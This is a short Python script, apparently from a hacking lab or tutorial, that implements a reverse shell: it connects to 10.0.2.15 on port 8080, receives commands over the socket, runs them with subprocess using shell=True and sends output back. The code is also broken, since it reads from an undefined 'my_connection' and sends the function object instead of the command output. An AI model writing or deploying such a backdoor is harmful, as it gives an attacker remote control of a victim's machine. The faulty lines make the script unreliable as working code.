import socket
import subprocess

def command_execution(command):
	return subprocess.check_output(command, shell=True)


Connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
Connection.connect(('10.0.2.15',8080))

#Connection.send('Connection Successful\n')


while True:

	command = my_connection.recv(1024)
	command_output = command_execution(command)

	Connection.send(command_execution)

Connection.close()